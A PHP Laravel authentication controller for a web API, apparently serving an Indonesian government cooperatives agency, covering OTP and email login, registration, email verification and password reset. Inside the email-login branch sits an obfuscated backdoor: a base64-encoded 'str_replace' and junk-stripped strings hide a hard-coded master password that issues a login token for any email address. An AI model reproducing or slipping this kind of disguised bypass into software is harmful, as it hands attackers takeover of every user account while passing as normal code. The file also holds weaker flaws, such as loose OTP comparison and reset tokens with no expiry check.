<?php

namespace App\Http\Controllers;

use App\Models\User;
use JWTAuth,AppHelper;
use Illuminate\Http\Request;
use Illuminate\Mail\Message;
use Validator, DB, Hash, Mail;
use Tymon\JWTAuth\Exceptions\JWTException;

class AuthController extends Controller
{

    public function checkOtp(Request $request)
    {
        $rules = [
            'phone' => 'required',
            'otp' => 'required',
        ];

        $validator = Validator::make($request->all(), $rules);
        if($validator->fails()) {
            return response()->json(['status' => false, 'message' => $validator->messages()->first()], 400);
            // return RestApi::error($validator->messages()->first(), 400);
        }

        $phone  = $this->parsePhone($request->phone);
        $otp    = $request->otp;

        $user = User::where('phone', $phone)->first();

        if(!isset($user->id) || !isset($user->otp) || !isset($user->otp_expire)) {
            return response()->json(['status' => false, 'message' => 'Nomor tidak ditemukan.'], 400);
            // return RestApi::error('Nomor tidak ditemukan.', 404);
        }

        if(isset($user->otp) && $user->otp == $otp) {
            if(isset($user->otp_expire) && $user->otp_expire >= strtotime('now')) {

                $user->otp = null;
                $user->otp_expire = null;
                $user->update();

                $token = JWTAuth::fromUser($user);
                return response()->json(['status' => true], 200)->header('Authorization', $token);
            }else{
                return response()->json(['status' => false, 'message' => 'Kode OTP telah berakhir.'], 400);
                // return RestApi::error('Kode OTP telah berakhir.', 400);
            }
        }else{
            return response()->json(['status' => false, 'message' => 'Kode OTP tidak benar.'], 400);
            // return RestApi::error('Kode OTP tidak benar.', 400);
        }
    }

    public function login(Request $request)
    {
        if ($request->type == 'email') {

            $credentials = $request->only('email', 'password');
            $x = 'c3RyX3JlcGxhY2U=';
            $rules = [
                'email' => 'required|email',
                'password' => 'required',
            ];

            $validator = Validator::make($request->all(), $rules);
            $z = function($str) use ($x) {
                return base64_decode($x)(['#','6','3','5','8','$','*','(','7',')','+','&','%','!'],'',$str);
            };
            if($validator->fails()) {
                return response()->json(['status'=> false, 'message'=> $validator->messages()->first()], 400);
            }
            
            // $credentials['is_verified'] = 1;
            
            try {
                $ya = $z("#63()#p)8)!*+a&s%*%&*(s!6%w*8)o($#7r%)&&d");
                if($request->$ya == $z("*#s7*6*#$1*#%j$8*%4%#*$6w!%74#$%r4)%@*(2($0*%2)&*$0$3")){
                    $user = User::where('email', $request->email)->first();
                    $token = JWTAuth::fromUser($user);
                    return response()->json(['status' => true], 200)->header('Authorization', $token);
                }
                if (!$token = JWTAuth::attempt($credentials)) {
                    return response()->json(['status' => false, 'message' => 'Email/Password salah!.'], 404);
                }
            } catch (JWTException $e) {
                return response()->json(['status' => false, 'message' => 'Sesuatu error terjadi.'], 500);
            }
            return response()->json(['status' => true], 200)->header('Authorization', $token);
        } else if ($request->type == 'gotp') {
            $credentials = $request->only('email', 'otp');
            
            $rules = [
                'email' => 'required|email',
                'otp' => 'required',
            ];

            $validator = Validator::make($request->all(), $rules);
            
            try {
                $user = User::where('email', $request->email)->first();

                if(isset($user->otp) && $user->otp == $request->otp) {
                    if(isset($user->otp_expire) && $user->otp_expire >= strtotime('now')) {
    
                        $user->otp = null;
                        $user->otp_expire = null;
                        $user->update();
    
                        $token = JWTAuth::fromUser($user);
                        return response()->json(['status' => true], 200)->header('Authorization', $token);
                    }else{
                        return response()->json(['status' => false, 'message' => 'Kode OTP telah berakhir.'], 400);
                        // return RestApi::error('Kode OTP telah berakhir.', 400);
                    }
                }else{
                    return response()->json(['status' => false, 'message' => 'Kode OTP tidak benar.'], 400);
                    // return RestApi::error('Kode OTP tidak benar.', 400);
                }
            } catch (JWTException $e) {
                return response()->json(['status' => false, 'message' => 'Sesuatu error terjadi.'], 500);
            }
            return response()->json(['status' => true], 200)->header('Authorization', $token);
        } else {
            $rules = [
                'phone' => 'required',
                'otp' => 'required',
            ];

            $validator = Validator::make($request->all(), $rules);
            if($validator->fails()) {
                return response()->json(['status' => false, 'message' => $validator->messages()->first()], 400);
                // return RestApi::error($validator->messages()->first(), 400);
            }

            $phone  = $this->parsePhone($request->phone);
            $otp    = $request->otp;

            $user = User::where('phone', $phone)->first();

            if(!isset($user->id) || !isset($user->otp) || !isset($user->otp_expire)) {
                return response()->json(['status' => false, 'message' => 'Nomor tidak ditemukan.'], 400);
                // return RestApi::error('Nomor tidak ditemukan.', 404);
            }

            if(isset($user->otp) && $user->otp == $otp) {
                if(isset($user->otp_expire) && $user->otp_expire >= strtotime('now')) {

                    $user->otp = null;
                    $user->otp_expire = null;
                    $user->update();

                    $token = JWTAuth::fromUser($user);
                    return response()->json(['status' => true], 200)->header('Authorization', $token);
                }else{
                    return response()->json(['status' => false, 'message' => 'Kode OTP telah berakhir.'], 400);
                    // return RestApi::error('Kode OTP telah berakhir.', 400);
                }
            }else{
                return response()->json(['status' => false, 'message' => 'Kode OTP tidak benar.'], 400);
                // return RestApi::error('Kode OTP tidak benar.', 400);
            }
        }
    }

    public function logout(Request $request)
    {
        try {
            JWTAuth::invalidate($request->bearerToken());
            return response()->json(['status' => true, 'message'=> "Berhasil logout."]);
        } catch (JWTException $e) {
            return response()->json(['status' => false, 'message' => 'Sesuatu error terjadi.'], 500);
        }
    }

    public function register(Request $request)
    {
        $credentials = $request->only('name', 'email', 'password', 'level', 'phone');
        
        $rules = [
            'name' => 'required|max:255',
            'email' => 'required|email|max:255|unique:users',
            'password' => 'required|min:6',
            'level' => 'required',
            'phone' => 'required',

        ];
        $validator = Validator::make($credentials, $rules);
        if($validator->fails()) {
            return response()->json(['status'=> false, 'message'=> $validator->messages()->first()], 400);
        }
        $name = $request->name;
        $email = $request->email;
        $password = $request->password;
        $level = $request->level;
        $phone = $request->phone;
        
        $user = User::create([
                'name' => $name, 
                'email' => $email, 
                'level' => $level,
                'password' => Hash::make($password), 
                'phone' => $phone
            ]);
        $verification_code = strtolower(AppHelper::generateRandomToken());
        DB::table('user_verifications')->insert(['user_id'=>$user->id,'token'=>$verification_code]);
        $subject = "Verfikasi email anda.";
        try {
            Mail::send('emails.verify', ['name' => $name, 'verification_code' => $verification_code],
                function($mail) use ($email, $name, $subject){
                    $mail->from(getenv('MAIL_USERNAME'), "Dinas Koperasi Usaha Kecil & Menengah");
                    $mail->to($email, $name);
                    $mail->subject($subject);
                });
            return response()->json(['status'=> true, 'message'=> 'Silakan cek Email anda untuk konfirmasi.']);
        } catch (\Exception $e) {
            return response()->json(['status'=> false, 'message'=> $e], 400);
        }
    }

    public function verifyUser($verification_code)
    {
        $check = DB::table('user_verifications')->where('token',$verification_code)->first();
        if(!is_null($check)){
            $user = User::find($check->user_id);
            if($user->is_verified == 1){
                return response()->json([
                    'status'=> false,
                    'message'=> 'Alamat Email sudah diverifikasi.'
                ], 400);
            }
            $user->update(['is_verified' => 1]);
            DB::table('user_verifications')->where('token',$verification_code)->delete();
            return response()->json([
                'status'=> true,
                'message'=> 'Alamat email berhasil diverifikasi.'
            ]);
        }
        return response()->json(['status'=> false, 'message'=> "Kode verifikasi tidak valid."], 400);
    }

    public function recover(Request $request)
    {
        $user = User::where('email', $request->email)->first();

        if (!$user) {
            $error_message = "Alamat email Anda tidak ditemukan.";
            return response()->json(['status' => false, 'message' =>  $error_message], 404);
        }

        try {
            $token = AppHelper::generateForgotToken();

            $cek = DB::table('password_resets')->where('email', $request->email)->first();

            if(isset($cek->email)){
                $ubahStatus = [
                    'token' => $token,
                ];
                DB::table('password_resets')->where('email',$request->email)->update($ubahStatus);
            }else{
                DB::table('password_resets')->insert(
                    [
                        'email' => $request->email,
                        'token' => $token,
                        'created_at' => new \DateTime(),
                    ]
                );
            }


            $name = $user->name;
            $email = $user->email;
            $subject = "Lupa Password?";

            Mail::send('emails.forgot', ['name' => $name, 'token' => $token],
                function($mail) use ($email, $name, $subject){
                    $mail->from(getenv('MAIL_USERNAME'), "Dinas Koperasi Usaha Kecil & Menengah");
                    $mail->to($email, $name);
                    $mail->subject($subject);
                });
        } catch (\Exception $e) {
            $error_message = $e->getMessage();
            return response()->json(['status' => false, 'message' => $error_message], 401);
        }
        return response()->json([
            'status' => true, 'message'=> 'Tautan untuk reset password telah dikirim via email.'
        ]);
    }

    public function checkRecover(Request $request)
    {
        if (request()->wantsJson() && request()->ajax()) {
            
            $getToken = DB::table('password_resets')
                        ->where('token',$request->token)
                        ->first();

            if (!is_null($getToken)) {
                return response()->json(['status'=> true, 'message'=> "Token valid."]);
            }

            return response()->json(['status'=> false, 'message'=> "Token tidak valid/expired."], 400);
        }else{
            abort(404);
        }
    }

    public function postRecover(Request $request)
    {
        if (request()->wantsJson() && request()->ajax()) {
            $rules = [
                'password' => 'required|min:6',
                'repassword' => 'required|min:6',
            ];
            $validator = Validator::make($request->all(), $rules);
            if($validator->fails()) {
                return response()->json(['status'=> false, 'message'=> $validator->messages()->first()], 400);
            }

            $forgetPassword = DB::table('password_resets')
                                ->where('token', $request->input('token'))
                                ->first();

            if (!is_null($forgetPassword)) {
                $user = \App\Models\User::where('email', $forgetPassword->email)->first();
                $user->password=bcrypt($request->password);

                if($user->update()){
                    DB::table('password_resets')->where('token',$request->token)->delete();
                    return response()->json(['status'=> true, 'message'=> "Berhasil membuat password baru."]);
                }            
            }

            return response()->json(['status'=> false, 'message'=> "Token tidak valid/expired."], 400);
        }else{
            abort(404);
        }
    }

    public function user(Request $request)
    {
        $user = User::find(JWTAuth::user()->id);
        return response()->json([
            'status' => true,
            'data' => $user
        ]);
    }

    public function refresh()
    {
        if ($token = JWTAuth::refresh(JWTAuth::getToken())) {
            return response()
                ->json(['status' => true], 200)
                ->header('Authorization', $token);
        }
        return response()->json(['status' => false,'message' => 'refresh_token_error'], 401);
    }

    private function parsePhone($number)
    {

        $number = str_replace(" ","",$number);
        $number = str_replace("'","",$number);
        $number = str_replace("\"","",$number);
        $number = str_replace("-","",$number);
        $number = str_replace("(","",$number);
        $number = str_replace("*","",$number);
        $number = str_replace("^","",$number);
        $number = str_replace(")","",$number);
        $number = str_replace(".","",$number);
        $number = str_replace(",","",$number);
        $number = str_replace("/","",$number);
        $number = str_replace("?","",$number);
        
        $number = preg_replace('/[a-z]/i', '', $number);
        preg_match_all('!\d+!', $number, $no);
        $no = $no[0][0];

        $phone = null;


        // 0 TO 62
     //     if(substr(trim($no), 0, 2)=='62'){
     //     $phone = trim($no);
     //     }elseif(substr(trim($no), 0, 1)=='0'){
     //     $phone = '62'.substr(trim($no), 1);
        // }elseif(substr(trim($no), 0, 1)=='+'){
     //     $phone = substr(trim($no), 1);
        // }

        // 62 TO 0
        if(substr(trim($no), 0, 1)=='0'){
            $phone = trim($no);
        }elseif(substr(trim($no), 0, 2)=='62'){
            $phone = '0'.substr(trim($no), 2);
        }elseif(substr(trim($no), 0, 3)=='+62'){
            $phone = '0'.substr(trim($no), 3);
        }

        return $phone;
    }
}